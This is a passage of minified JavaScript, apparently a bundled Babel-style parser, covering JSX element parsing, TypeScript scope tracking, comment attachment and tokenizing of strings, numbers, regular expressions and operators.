Q.name=this.jsxParseNamespacedName(),Q.value=this.eat(29)?this.jsxParseAttributeValue():null,this.finishNode(Q,"JSXAttribute")}jsxParseOpeningElementAt(Q){let Y=this.startNodeAt(Q);if(this.eat(144))return this.finishNode(Y,"JSXOpeningFragment");return Y.name=this.jsxParseElementName(),this.jsxParseOpeningElementAfterName(Y)}jsxParseOpeningElementAfterName(Q){let Y=[];while(!this.match(56)&&!this.match(144))Y.push(this.jsxParseAttribute());return Q.attributes=Y,Q.selfClosing=this.eat(56),this.expect(144),this.finishNode(Q,"JSXOpeningElement")}jsxParseClosingElementAt(Q){let Y=this.startNodeAt(Q);if(this.eat(144))return this.finishNode(Y,"JSXClosingFragment");return Y.name=this.jsxParseElementName(),this.expect(144),this.finishNode(Y,"JSXClosingElement")}jsxParseElementAt(Q){let Y=this.startNodeAt(Q),W=[],z=this.jsxParseOpeningElementAt(Q),G=null;if(!z.selfClosing){X:for(;;)switch(this.state.type){case 143:if(Q=this.state.startLoc,this.next(),this.eat(56)){G=this.jsxParseClosingElementAt(Q);break X}W.push(this.jsxParseElementAt(Q));break;case 142:W.push(this.parseLiteral(this.state.value,"JSXText"));break;case 5:{let H=this.startNode();if(this.setContext(w0.brace),this.next(),this.match(21))W.push(this.jsxParseSpreadChild(H));else W.push(this.jsxParseExpressionContainer(H,w0.j_expr));break}default:this.unexpected()}if(d6(z)&&!d6(G)&&G!==null)this.raise(PX.MissingClosingTagFragment,G);else if(!d6(z)&&d6(G))this.raise(PX.MissingClosingTagElement,G,{openingTagName:xJ(z.name)});else if(!d6(z)&&!d6(G)){if(xJ(G.name)!==xJ(z.name))this.raise(PX.MissingClosingTagElement,G,{openingTagName:xJ(z.name)})}}if(d6(z))Y.openingFragment=z,Y.closingFragment=G;else Y.openingElement=z,Y.closingElement=G;if(Y.children=W,this.match(47))throw this.raise(PX.UnwrappedAdjacentJSXElements,this.state.startLoc);return d6(z)?this.finishNode(Y,"JSXFragment"):this.finishNode(Y,"JSXElement")}jsxParseElement(){let Q=this.state.startLoc;return this.next(),this.jsxParseElementAt(Q)}setContext(Q){let{context:Y}=this.state;Y[Y.length-1]=Q}parseExprAtom(Q){if(this.match(143))return this.jsxParseElement();else if(this.match(47)&&this.input.charCodeAt(this.state.pos)!==33)return this.replaceToken(143),this.jsxParseElement();else return super.parseExprAtom(Q)}skipSpace(){if(!this.curContext().preserveSpace)super.skipSpace()}getTokenFromCode(Q){let Y=this.curContext();if(Y===w0.j_expr){this.jsxReadToken();return}if(Y===w0.j_oTag||Y===w0.j_cTag){if(N6(Q)){this.jsxReadWord();return}if(Q===62){++this.state.pos,this.finishToken(144);return}if((Q===34||Q===39)&&Y===w0.j_oTag){this.jsxReadString(Q);return}}if(Q===60&&this.state.canStartJSXElement&&this.input.charCodeAt(this.state.pos+1)!==33){++this.state.pos,this.finishToken(143);return}super.getTokenFromCode(Q)}updateContext(Q){let{context:Y,type:W}=this.state;if(W===56&&Q===143)Y.splice(-2,2,w0.j_cTag),this.state.canStartJSXElement=!1;else if(W===143)Y.push(w0.j_oTag);else if(W===144){let z=Y[Y.length-1];if(z===w0.j_oTag&&Q===56||z===w0.j_cTag)Y.pop(),this.state.canStartJSXElement=Y[Y.length-1]===w0.j_expr;else this.setContext(w0.j_expr),this.state.canStartJSXElement=!0}else this.state.canStartJSXElement=cT(W)}};class tK extends z4{constructor(...X){super(...X);this.tsNames=new Map}}class eK extends H4{constructor(...X){super(...X);this.importsStack=[]}createScope(X){return this.importsStack.push(new Set),new tK(X)}enter(X){if(X===1024)this.importsStack.push(new Set);super.enter(X)}exit(){let X=super.exit();if(X===1024)this.importsStack.pop();return X}hasImport(X,J){let Q=this.importsStack.length;if(this.importsStack[Q-1].has(X))return!0;if(!J&&Q>1){for(let Y=0;Y<Q-1;Y++)if(this.importsStack[Y].has(X))return!0}return!1}declareName(X,J,Q){if(J&4096){if(this.hasImport(X,!0))this.parser.raise(b.VarRedeclaration,Q,{identifierName:X});this.importsStack[this.importsStack.length-1].add(X);return}let Y=this.currentScope(),W=Y.tsNames.get(X)||0;if(J&1024){this.maybeExportDefined(Y,X),Y.tsNames.set(X,W|16);return}if(super.declareName(X,J,Q),J&2){if(!(J&1))this.checkRedeclarationInScope(Y,X,J,Q),this.maybeExportDefined(Y,X);W=W|1}if(J&256)W=W|2;if(J&512)W=W|4;if(J&128)W=W|8;if(W)Y.tsNames.set(X,W)}isRedeclaredInScope(X,J,Q){let Y=X.tsNames.get(J);if((Y&2)>0){if(Q&256){let W=!!(Q&512),z=(Y&4)>0;return W!==z}return!0}if(Q&128&&(Y&8)>0)if(X.names.get(J)&2)return!!(Q&1);else return!1;if(Q&2&&(Y&1)>0)return!0;return super.isRedeclaredInScope(X,J,Q)}checkLocalExport(X){let{name:J}=X;if(this.hasImport(J))return;let Q=this.scopeStack.length;for(let Y=Q-1;Y>=0;Y--){let z=this.scopeStack[Y].tsNames.get(J);if((z&1)>0||(z&16)>0)return}super.checkLocalExport(X)}}class XV{constructor(){this.stacks=[]}enter(X){this.stacks.push(X)}exit(){this.stacks.pop()}currentFlags(){return this.stacks[this.stacks.length-1]}get hasAwait(){return(this.currentFlags()&2)>0}get hasYield(){return(this.currentFlags()&1)>0}get hasReturn(){return(this.currentFlags()&4)>0}get hasIn(){return(this.currentFlags()&8)>0}}function W4(X,J){return(X?2:0)|(J?1:0)}class JV{constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}sourceToOffsetPos(X){return X+this.startIndex}offsetToSourcePos(X){return X-this.startIndex}hasPlugin(X){if(typeof X==="string")return this.plugins.has(X);else{let[J,Q]=X;if(!this.hasPlugin(J))return!1;let Y=this.plugins.get(J);for(let W of Object.keys(Q))if((Y==null?void 0:Y[W])!==Q[W])return!1;return!0}}getPluginOption(X,J){var Q;return(Q=this.plugins.get(X))==null?void 0:Q[J]}}function QV(X,J){if(X.trailingComments===void 0)X.trailingComments=J;else X.trailingComments.unshift(...J)}function O_(X,J){if(X.leadingComments===void 0)X.leadingComments=J;else X.leadingComments.unshift(...J)}function A5(X,J){if(X.innerComments===void 0)X.innerComments=J;else X.innerComments.unshift(...J)}function i6(X,J,Q){let Y=null,W=J.length;while(Y===null&&W>0)Y=J[--W];if(Y===null||Y.start>Q.start)A5(X,Q.comments);else QV(Y,Q.comments)}class YV extends JV{addComment(X){if(this.filename)X.loc.filename=this.filename;let{commentsLen:J}=this.state;if(this.comments.length!==J)this.comments.length=J;this.comments.push(X),this.state.commentsLen++}processComment(X){let{commentStack:J}=this.state,Q=J.length;if(Q===0)return;let Y=Q-1,W=J[Y];if(W.start===X.end)W.leadingNode=X,Y--;let{start:z}=X;for(;Y>=0;Y--){let G=J[Y],H=G.end;if(H>z)G.containingNode=X,this.finalizeComment(G),J.splice(Y,1);else{if(H===z)G.trailingNode=X;break}}}finalizeComment(X){var J;let{comments:Q}=X;if(X.leadingNode!==null||X.trailingNode!==null){if(X.leadingNode!==null)QV(X.leadingNode,Q);if(X.trailingNode!==null)O_(X.trailingNode,Q)}else{let{containingNode:Y,start:W}=X;if(this.input.charCodeAt(this.offsetToSourcePos(W)-1)===44)switch(Y.type){case"ObjectExpression":case"ObjectPattern":case"RecordExpression":i6(Y,Y.properties,X);break;case"CallExpression":case"OptionalCallExpression":i6(Y,Y.arguments,X);break;case"ImportExpression":i6(Y,[Y.source,(J=Y.options)!=null?J:null],X);break;case"FunctionDeclaration":case"FunctionExpression":case"ArrowFunctionExpression":case"ObjectMethod":case"ClassMethod":case"ClassPrivateMethod":i6(Y,Y.params,X);break;case"ArrayExpression":case"ArrayPattern":case"TupleExpression":i6(Y,Y.elements,X);break;case"ExportNamedDeclaration":case"ImportDeclaration":i6(Y,Y.specifiers,X);break;case"TSEnumDeclaration":i6(Y,Y.members,X);break;case"TSEnumBody":i6(Y,Y.members,X);break;default:A5(Y,Q)}else A5(Y,Q)}}finalizeRemainingComments(){let{commentStack:X}=this.state;for(let J=X.length-1;J>=0;J--)this.finalizeComment(X[J]);this.state.commentStack=[]}resetPreviousNodeTrailingComments(X){let{commentStack:J}=this.state,{length:Q}=J;if(Q===0)return;let Y=J[Q-1];if(Y.leadingNode===X)Y.leadingNode=null}takeSurroundingComments(X,J,Q){let{commentStack:Y}=this.state,W=Y.length;if(W===0)return;let z=W-1;for(;z>=0;z--){let G=Y[z],H=G.end;if(G.start===Q)G.leadingNode=X;else if(H===J)G.trailingNode=X;else if(H<J)break}}}class WW{constructor(){this.flags=1024,this.startIndex=void 0,this.curLine=void 0,this.lineStart=void 0,this.startLoc=void 0,this.endLoc=void 0,this.errors=[],this.potentialArrowAt=-1,this.noArrowAt=[],this.noArrowParamsConversionAt=[],this.topicContext={maxNumOfResolvableTopics:0,maxTopicIndex:null},this.labels=[],this.commentsLen=0,this.commentStack=[],this.pos=0,this.type=140,this.value=null,this.start=0,this.end=0,this.lastTokEndLoc=null,this.lastTokStartLoc=null,this.context=[w0.brace],this.firstInvalidTemplateEscapePos=null,this.strictErrors=new Map,this.tokensLength=0}get strict(){return(this.flags&1)>0}set strict(X){if(X)this.flags|=1;else this.flags&=-2}init({strictMode:X,sourceType:J,startIndex:Q,startLine:Y,startColumn:W}){this.strict=X===!1?!1:X===!0?!0:J==="module",this.startIndex=Q,this.curLine=Y,this.lineStart=-W,this.startLoc=this.endLoc=new L6(Y,W,Q)}get maybeInArrowParameters(){return(this.flags&2)>0}set maybeInArrowParameters(X){if(X)this.flags|=2;else this.flags&=-3}get inType(){return(this.flags&4)>0}set inType(X){if(X)this.flags|=4;else this.flags&=-5}get noAnonFunctionType(){return(this.flags&8)>0}set noAnonFunctionType(X){if(X)this.flags|=8;else this.flags&=-9}get hasFlowComment(){return(this.flags&16)>0}set hasFlowComment(X){if(X)this.flags|=16;else this.flags&=-17}get isAmbientContext(){return(this.flags&32)>0}set isAmbientContext(X){if(X)this.flags|=32;else this.flags&=-33}get inAbstractClass(){return(this.flags&64)>0}set inAbstractClass(X){if(X)this.flags|=64;else this.flags&=-65}get inDisallowConditionalTypesContext(){return(this.flags&128)>0}set inDisallowConditionalTypesContext(X){if(X)this.flags|=128;else this.flags&=-129}get soloAwait(){return(this.flags&256)>0}set soloAwait(X){if(X)this.flags|=256;else this.flags&=-257}get inFSharpPipelineDirectBody(){return(this.flags&512)>0}set inFSharpPipelineDirectBody(X){if(X)this.flags|=512;else this.flags&=-513}get canStartJSXElement(){return(this.flags&1024)>0}set canStartJSXElement(X){if(X)this.flags|=1024;else this.flags&=-1025}get containsEsc(){return(this.flags&2048)>0}set containsEsc(X){if(X)this.flags|=2048;else this.flags&=-2049}get hasTopLevelAwait(){return(this.flags&4096)>0}set hasTopLevelAwait(X){if(X)this.flags|=4096;else this.flags&=-4097}curPosition(){return new L6(this.curLine,this.pos-this.lineStart,this.pos+this.startIndex)}clone(){let X=new WW;return X.flags=this.flags,X.startIndex=this.startIndex,X.curLine=this.curLine,X.lineStart=this.lineStart,X.startLoc=this.startLoc,X.endLoc=this.endLoc,X.errors=this.errors.slice(),X.potentialArrowAt=this.potentialArrowAt,X.noArrowAt=this.noArrowAt.slice(),X.noArrowParamsConversionAt=this.noArrowParamsConversionAt.slice(),X.topicContext=this.topicContext,X.labels=this.labels.slice(),X.commentsLen=this.commentsLen,X.commentStack=this.commentStack.slice(),X.pos=this.pos,X.type=this.type,X.value=this.value,X.start=this.start,X.end=this.end,X.lastTokEndLoc=this.lastTokEndLoc,X.lastTokStartLoc=this.lastTokStartLoc,X.context=this.context.slice(),X.firstInvalidTemplateEscapePos=this.firstInvalidTemplateEscapePos,X.strictErrors=this.strictErrors,X.tokensLength=this.tokensLength,X}}var R_=function X(J){return J>=48&&J<=57},xK={decBinOct:new Set([46,66,69,79,95,98,101,111]),hex:new Set([46,88,95,120])},J4={bin:(X)=>X===48||X===49,oct:(X)=>X>=48&&X<=55,dec:(X)=>X>=48&&X<=57,hex:(X)=>X>=48&&X<=57||X>=65&&X<=70||X>=97&&X<=102};function fK(X,J,Q,Y,W,z){let G=Q,H=Y,U=W,K="",V=null,B=Q,{length:Z}=J;for(;;){if(Q>=Z){z.unterminated(G,H,U),K+=J.slice(B,Q);break}let M=J.charCodeAt(Q);if(A_(X,M,J,Q)){K+=J.slice(B,Q);break}if(M===92){K+=J.slice(B,Q);let F=N_(J,Q,Y,W,X==="template",z);if(F.ch===null&&!V)V={pos:Q,lineStart:Y,curLine:W};else K+=F.ch;({pos:Q,lineStart:Y,curLine:W}=F),B=Q}else if(M===8232||M===8233)++Q,++W,Y=Q;else if(M===10||M===13)if(X==="template"){if(K+=J.slice(B,Q)+`
`,++Q,M===13&&J.charCodeAt(Q)===10)++Q;++W,B=Y=Q}else z.unterminated(G,H,U);else++Q}return{pos:Q,str:K,firstInvalidLoc:V,lineStart:Y,curLine:W,containsInvalid:!!V}}function A_(X,J,Q,Y){if(X==="template")return J===96||J===36&&Q.charCodeAt(Y+1)===123;return J===(X==="double"?34:39)}function N_(X,J,Q,Y,W,z){let G=!W;J++;let H=(K)=>({pos:J,ch:K,lineStart:Q,curLine:Y}),U=X.charCodeAt(J++);switch(U){case 110:return H(`
`);case 114:return H("\r");case 120:{let K;return{code:K,pos:J}=iY(X,J,Q,Y,2,!1,G,z),H(K===null?null:String.fromCharCode(K))}case 117:{let K;return{code:K,pos:J}=GV(X,J,Q,Y,G,z),H(K===null?null:String.fromCodePoint(K))}case 116:return H("\t");case 98:return H("\b");case 118:return H("\v");case 102:return H("\f");case 13:if(X.charCodeAt(J)===10)++J;case 10:Q=J,++Y;case 8232:case 8233:return H("");case 56:case 57:if(W)return H(null);else z.strictNumericEscape(J-1,Q,Y);default:if(U>=48&&U<=55){let K=J-1,B=/^[0-7]+/.exec(X.slice(K,J+2))[0],Z=parseInt(B,8);if(Z>255)B=B.slice(0,-1),Z=parseInt(B,8);J+=B.length-1;let M=X.charCodeAt(J);if(B!=="0"||M===56||M===57)if(W)return H(null);else z.strictNumericEscape(K,Q,Y);return H(String.fromCharCode(Z))}return H(String.fromCharCode(U))}}function iY(X,J,Q,Y,W,z,G,H){let U=J,K;if({n:K,pos:J}=WV(X,J,Q,Y,16,W,z,!1,H,!G),K===null)if(G)H.invalidEscapeSequence(U,Q,Y);else J=U-1;return{code:K,pos:J}}function WV(X,J,Q,Y,W,z,G,H,U,K){let V=J,B=W===16?xK.hex:xK.decBinOct,Z=W===16?J4.hex:W===10?J4.dec:W===8?J4.oct:J4.bin,M=!1,F=0;for(let j=0,O=z==null?1/0:z;j<O;++j){let N=X.charCodeAt(J),A;if(N===95&&H!=="bail"){let D=X.charCodeAt(J-1),S=X.charCodeAt(J+1);if(!H){if(K)return{n:null,pos:J};U.numericSeparatorInEscapeSequence(J,Q,Y)}else if(Number.isNaN(S)||!Z(S)||B.has(D)||B.has(S)){if(K)return{n:null,pos:J};U.unexpectedNumericSeparator(J,Q,Y)}++J;continue}if(N>=97)A=N-97+10;else if(N>=65)A=N-65+10;else if(R_(N))A=N-48;else A=1/0;if(A>=W)if(A<=9&&K)return{n:null,pos:J};else if(A<=9&&U.invalidDigit(J,Q,Y,W))A=0;else if(G)A=0,M=!0;else break;++J,F=F*W+A}if(J===V||z!=null&&J-V!==z||M)return{n:null,pos:J};return{n:F,pos:J}}function GV(X,J,Q,Y,W,z){let G=X.charCodeAt(J),H;if(G===123){if(++J,{code:H,pos:J}=iY(X,J,Q,Y,X.indexOf("}",J)-J,!0,W,z),++J,H!==null&&H>1114111)if(W)z.invalidCodePoint(J,Q,Y);else return{code:null,pos:J}}else({code:H,pos:J}=iY(X,J,Q,Y,4,!1,W,z));return{code:H,pos:J}}function Z5(X,J,Q){return new L6(Q,X-J,X)}var L_=new Set([103,109,115,105,121,117,100,118]);class R6{constructor(X){let J=X.startIndex||0;this.type=X.type,this.value=X.value,this.start=J+X.start,this.end=J+X.end,this.loc=new R5(X.startLoc,X.endLoc)}}class zV extends YV{constructor(X,J){super();this.isLookahead=void 0,this.tokens=[],this.errorHandlers_readInt={invalidDigit:(Q,Y,W,z)=>{if(!(this.optionFlags&2048))return!1;return this.raise(b.InvalidDigit,Z5(Q,Y,W),{radix:z}),!0},numericSeparatorInEscapeSequence:this.errorBuilder(b.NumericSeparatorInEscapeSequence),unexpectedNumericSeparator:this.errorBuilder(b.UnexpectedNumericSeparator)},this.errorHandlers_readCodePoint=Object.assign({},this.errorHandlers_readInt,{invalidEscapeSequence:this.errorBuilder(b.InvalidEscapeSequence),invalidCodePoint:this.errorBuilder(b.InvalidCodePoint)}),this.errorHandlers_readStringContents_string=Object.assign({},this.errorHandlers_readCodePoint,{strictNumericEscape:(Q,Y,W)=>{this.recordStrictModeErrors(b.StrictNumericEscape,Z5(Q,Y,W))},unterminated:(Q,Y,W)=>{throw this.raise(b.UnterminatedString,Z5(Q-1,Y,W))}}),this.errorHandlers_readStringContents_template=Object.assign({},this.errorHandlers_readCodePoint,{strictNumericEscape:this.errorBuilder(b.StrictNumericEscape),unterminated:(Q,Y,W)=>{throw this.raise(b.UnterminatedTemplate,Z5(Q,Y,W))}}),this.state=new WW,this.state.init(X),this.input=J,this.length=J.length,this.comments=[],this.isLookahead=!1}pushToken(X){this.tokens.length=this.state.tokensLength,this.tokens.push(X),++this.state.tokensLength}next(){if(this.checkKeywordEscapes(),this.optionFlags&256)this.pushToken(new R6(this.state));this.state.lastTokEndLoc=this.state.endLoc,this.state.lastTokStartLoc=this.state.startLoc,this.nextToken()}eat(X){if(this.match(X))return this.next(),!0;else return!1}match(X){return this.state.type===X}createLookaheadState(X){return{pos:X.pos,value:null,type:X.type,start:X.start,end:X.end,context:[this.curContext()],inType:X.inType,startLoc:X.startLoc,lastTokEndLoc:X.lastTokEndLoc,curLine:X.curLine,lineStart:X.lineStart,curPosition:X.curPosition}}lookahead(){let X=this.state;this.state=this.createLookaheadState(X),this.isLookahead=!0,this.nextToken(),this.isLookahead=!1;let J=this.state;return this.state=X,J}nextTokenStart(){return this.nextTokenStartSince(this.state.pos)}nextTokenStartSince(X){return uY.lastIndex=X,uY.test(this.input)?uY.lastIndex:X}lookaheadCharCode(){return this.lookaheadCharCodeSince(this.state.pos)}lookaheadCharCodeSince(X){return this.input.charCodeAt(this.nextTokenStartSince(X))}nextTokenInLineStart(){return this.nextTokenInLineStartSince(this.state.pos)}nextTokenInLineStartSince(X){return cY.lastIndex=X,cY.test(this.input)?cY.lastIndex:X}lookaheadInLineCharCode(){return this.input.charCodeAt(this.nextTokenInLineStart())}codePointAtPos(X){let J=this.input.charCodeAt(X);if((J&64512)===55296&&++X<this.input.length){let Q=this.input.charCodeAt(X);if((Q&64512)===56320)J=65536+((J&1023)<<10)+(Q&1023)}return J}setStrict(X){if(this.state.strict=X,X)this.state.strictErrors.forEach(([J,Q])=>this.raise(J,Q)),this.state.strictErrors.clear()}curContext(){return this.state.context[this.state.context.length-1]}nextToken(){if(this.skipSpace(),this.state.start=this.state.pos,!this.isLookahead)this.state.startLoc=this.state.curPosition();if(this.state.pos>=this.length){this.finishToken(140);return}this.getTokenFromCode(this.codePointAtPos(this.state.pos))}skipBlockComment(X){let J;if(!this.isLookahead)J=this.state.curPosition();let Q=this.state.pos,Y=this.input.indexOf(X,Q+2);if(Y===-1)throw this.raise(b.UnterminatedComment,this.state.curPosition());this.state.pos=Y+X.length,X4.lastIndex=Q+2;while(X4.test(this.input)&&X4.lastIndex<=Y)++this.state.curLine,this.state.lineStart=X4.lastIndex;if(this.isLookahead)return;let W={type:"CommentBlock",value:this.input.slice(Q+2,Y),start:this.sourceToOffsetPos(Q),end:this.sourceToOffsetPos(Y+X.length),loc:new R5(J,this.state.curPosition())};if(this.optionFlags&256)this.pushToken(W);return W}skipLineComment(X){let J=this.state.pos,Q;if(!this.isLookahead)Q=this.state.curPosition();let Y=this.input.charCodeAt(this.state.pos+=X);if(this.state.pos<this.length)while(!gJ(Y)&&++this.state.pos<this.length)Y=this.input.charCodeAt(this.state.pos);if(this.isLookahead)return;let W=this.state.pos,G={type:"CommentLine",value:this.input.slice(J+X,W),start:this.sourceToOffsetPos(J),end:this.sourceToOffsetPos(W),loc:new R5(Q,this.state.curPosition())};if(this.optionFlags&256)this.pushToken(G);return G}skipSpace(){let X=this.state.pos,J=this.optionFlags&4096?[]:null;X:while(this.state.pos<this.length){let Q=this.input.charCodeAt(this.state.pos);switch(Q){case 32:case 160:case 9:++this.state.pos;break;case 13:if(this.input.charCodeAt(this.state.pos+1)===10)++this.state.pos;case 10:case 8232:case 8233:++this.state.pos,++this.state.curLine,this.state.lineStart=this.state.pos;break;case 47:switch(this.input.charCodeAt(this.state.pos+1)){case 42:{let Y=this.skipBlockComment("*/");if(Y!==void 0)this.addComment(Y),J==null||J.push(Y);break}case 47:{let Y=this.skipLineComment(2);if(Y!==void 0)this.addComment(Y),J==null||J.push(Y);break}default:break X}break;default:if(F_(Q))++this.state.pos;else if(Q===45&&!this.inModule&&this.optionFlags&8192){let Y=this.state.pos;if(this.input.charCodeAt(Y+1)===45&&this.input.charCodeAt(Y+2)===62&&(X===0||this.state.lineStart>X)){let W=this.skipLineComment(3);if(W!==void 0)this.addComment(W),J==null||J.push(W)}else break X}else if(Q===60&&!this.inModule&&this.optionFlags&8192){let Y=this.state.pos;if(this.input.charCodeAt(Y+1)===33&&this.input.charCodeAt(Y+2)===45&&this.input.charCodeAt(Y+3)===45){let W=this.skipLineComment(4);if(W!==void 0)this.addComment(W),J==null||J.push(W)}else break X}else break X}}if((J==null?void 0:J.length)>0){let Q=this.state.pos,Y={start:this.sourceToOffsetPos(X),end:this.sourceToOffsetPos(Q),comments:J,leadingNode:null,trailingNode:null,containingNode:null};this.state.commentStack.push(Y)}}finishToken(X,J){this.state.end=this.state.pos,this.state.endLoc=this.state.curPosition();let Q=this.state.type;if(this.state.type=X,this.state.value=J,!this.isLookahead)this.updateContext(Q)}replaceToken(X){this.state.type=X,this.updateContext()}readToken_numberSign(){if(this.state.pos===0&&this.readToken_interpreter())return;let X=this.state.pos+1,J=this.codePointAtPos(X);if(J>=48&&J<=57)throw this.raise(b.UnexpectedDigitAfterHash,this.state.curPosition());if(J===123||J===91&&this.hasPlugin("recordAndTuple")){if(this.expectPlugin("recordAndTuple"),this.getPluginOption("recordAndTuple","syntaxType")==="bar")throw this.raise(J===123?b.RecordExpressionHashIncorrectStartSyntaxType:b.TupleExpressionHashIncorrectStartSyntaxType,this.state.curPosition());if(this.state.pos+=2,J===123)this.finishToken(7);else this.finishToken(1)}else if(N6(J))++this.state.pos,this.finishToken(139,this.readWord1(J));else if(J===92)++this.state.pos,this.finishToken(139,this.readWord1());else this.finishOp(27,1)}readToken_dot(){let X=this.input.charCodeAt(this.state.pos+1);if(X>=48&&X<=57){this.readNumber(!0);return}if(X===46&&this.input.charCodeAt(this.state.pos+2)===46)this.state.pos+=3,this.finishToken(21);else++this.state.pos,this.finishToken(16)}readToken_slash(){if(this.input.charCodeAt(this.state.pos+1)===61)this.finishOp(31,2);else this.finishOp(56,1)}readToken_interpreter(){if(this.state.pos!==0||this.length<2)return!1;let X=this.input.charCodeAt(this.state.pos+1);if(X!==33)return!1;let J=this.state.pos;this.state.pos+=1;while(!gJ(X)&&++this.state.pos<this.length)X=this.input.charCodeAt(this.state.pos);let Q=this.input.slice(J+2,this.state.pos);return this.finishToken(28,Q),!0}readToken_mult_modulo(X){let J=X===42?55:54,Q=1,Y=this.input.charCodeAt(this.state.pos+1);if(X===42&&Y===42)Q++,Y=this.input.charCodeAt(this.state.pos+2),J=57;if(Y===61&&!this.state.inType)Q++,J=X===37?33:30;this.finishOp(J,Q)}readToken_pipe_amp(X){let J=this.input.charCodeAt(this.state.pos+1);if(J===X){if(this.input.charCodeAt(this.state.pos+2)===61)this.finishOp(30,3);else this.finishOp(X===124?41:42,2);return}if(X===124){if(J===62){this.finishOp(39,2);return}if(this.hasPlugin("recordAndTuple")&&J===125){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(b.RecordExpressionBarIncorrectEndSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(9);return}if(this.hasPlugin("recordAndTuple")&&J===93){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(b.TupleExpressionBarIncorrectEndSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(4);return}}if(J===61){this.finishOp(30,2);return}this.finishOp(X===124?43:45,1)}readToken_caret(){let X=this.input.charCodeAt(this.state.pos+1);if(X===61&&!this.state.inType)this.finishOp(32,2);else if(X===94&&this.hasPlugin(["pipelineOperator",{proposal:"hack",topicToken:"^^"}])){if(this.finishOp(37,2),this.input.codePointAt(this.state.pos)===94)this.unexpected()}else this.finishOp(44,1)}readToken_atSign(){if(this.input.charCodeAt(this.state.pos+1)===64&&this.hasPlugin(["pipelineOperator",{proposal:"hack",topicToken:"@@"}]))this.finishOp(38,2);else this.finishOp(26,1)}readToken_plus_min(X){let J=this.input.charCodeAt(this.state.pos+1);if(J===X){this.finishOp(34,2);return}if(J===61)this.finishOp(30,2);else this.finishOp(53,1)}readToken_lt(){let{pos:X}=this.state,J=this.input.charCodeAt(X+1);if(J===60){if(this.input.charCodeAt(X+2)===61){this.finishOp(30,3);return}this.finishOp(51,2);return}if(J===61){this.finishOp(49,2);return}this.finishOp(47,1)}readToken_gt(){let{pos:X}=this.state,J=this.input.charCodeAt(X+1);if(J===62){let Q=this.input.charCodeAt(X+2)===62?3:2;if(this.input.charCodeAt(X+Q)===61){this.finishOp(30,Q+1);return}this.finishOp(52,Q);return}if(J===61){this.finishOp(49,2);return}this.finishOp(48,1)}readToken_eq_excl(X){let J=this.input.charCodeAt(this.state.pos+1);if(J===61){this.finishOp(46,this.input.charCodeAt(this.state.pos+2)===61?3:2);return}if(X===61&&J===62){this.state.pos+=2,this.finishToken(19);return}this.finishOp(X===61?29:35,1)}readToken_question(){let X=this.input.charCodeAt(this.state.pos+1),J=this.input.charCodeAt(this.state.pos+2);if(X===63)if(J===61)this.finishOp(30,3);else this.finishOp(40,2);else if(X===46&&!(J>=48&&J<=57))this.state.pos+=2,this.finishToken(18);else++this.state.pos,this.finishToken(17)}getTokenFromCode(X){switch(X){case 46:this.readToken_dot();return;case 40:++this.state.pos,this.finishToken(10);return;case 41:++this.state.pos,this.finishToken(11);return;case 59:++this.state.pos,this.finishToken(13);return;case 44:++this.state.pos,this.finishToken(12);return;case 91:if(this.hasPlugin("recordAndTuple")&&this.input.charCodeAt(this.state.pos+1)===124){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(b.TupleExpressionBarIncorrectStartSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(2)}else++this.state.pos,this.finishToken(0);return;case 93:++this.state.pos,this.finishToken(3);return;case 123:if(this.hasPlugin("recordAndTuple")&&this.input.charCodeAt(this.state.pos+1)===124){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(b.RecordExpressionBarIncorrectStartSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(6)}else++this.state.pos,this.finishToken(5);return;case 125:++this.state.pos,this.finishToken(8);return;case 58:if(this.hasPlugin("functionBind")&&this.input.charCodeAt(this.state.pos+1)===58)this.finishOp(15,2);else++this.state.pos,this.finishToken(14);return;case 63:this.readToken_question();return;case 96:this.readTemplateToken();return;case 48:{let J=this.input.charCodeAt(this.state.pos+1);if(J===120||J===88){this.readRadixNumber(16);return}if(J===111||J===79){this.readRadixNumber(8);return}if(J===98||J===66){this.readRadixNumber(2);return}}case 49:case 50:case 51:case 52:case 53:case 54:case 55:case 56:case 57:this.readNumber(!1);return;case 34:case 39:this.readString(X);return;case 47:this.readToken_slash();return;case 37:case 42:this.readToken_mult_modulo(X);return;case 124:case 38:this.readToken_pipe_amp(X);return;case 94:this.readToken_caret();return;case 43:case 45:this.readToken_plus_min(X);return;case 60:this.readToken_lt();return;case 62:this.readToken_gt();return;case 61:case 33:this.readToken_eq_excl(X);return;case 126:this.finishOp(36,1);return;case 64:this.readToken_atSign();return;case 35:this.readToken_numberSign();return;case 92:this.readWord();return;default:if(N6(X)){this.readWord(X);return}}throw this.raise(b.InvalidOrUnexpectedToken,this.state.curPosition(),{unexpected:String.fromCodePoint(X)})}finishOp(X,J){let Q=this.input.slice(this.state.pos,this.state.pos+J);this.state.pos+=J,this.finishToken(X,Q)}readRegexp(){let X=this.state.startLoc,J=this.state.start+1,Q,Y,{pos:W}=this.state;for(;;++W){if(W>=this.length)throw this.raise(b.UnterminatedRegExp,C9(X,1));let U=this.input.charCodeAt(W);if(gJ(U))throw this.raise(b.UnterminatedRegExp,C9(X,1));if(Q)Q=!1;else{if(U===91)Y=!0;else if(U===93&&Y)Y=!1;else if(U===47&&!Y)break;Q=U===92}}let z=this.input.slice(J,W);++W;let G="",H=()=>C9(X,W+2-J);while(W<this.length){let U=this.codePointAtPos(W),K=String.fromCharCode(U);if(L_.has(U)){if(U===118){if(G.includes("u"))this.raise(b.IncompatibleRegExpUVFlags,H())}else if(U===117){if(G.includes("v"))this.raise(b.IncompatibleRegExpUVFlags,H())}if(G.includes(K))this.raise(b.DuplicateRegExpFlags,H())}else if(fJ(U)||U===92)this.raise(b.MalformedRegExpFlags,H());else break;++W,G+=K}this.state.pos=W,this.finishToken(138,{pattern:z,flags:G})}readInt(X,J,Q=!1,Y=!0){let{n:W,pos:z}=WV(this.input,this.state.pos,this.state.lineStart,this.state.curLine,X,J,Q,Y,this.errorHandlers_readInt,!1);return this.state.pos=z,W}readRadixNumber(X){let J=this.state.pos,Q=this.state.curPosition(),Y=!1;this.state.pos+=2;let W=this.readInt(X);if(W==null)this.raise(b.InvalidDigit,C9(Q,2),{radix:X});let 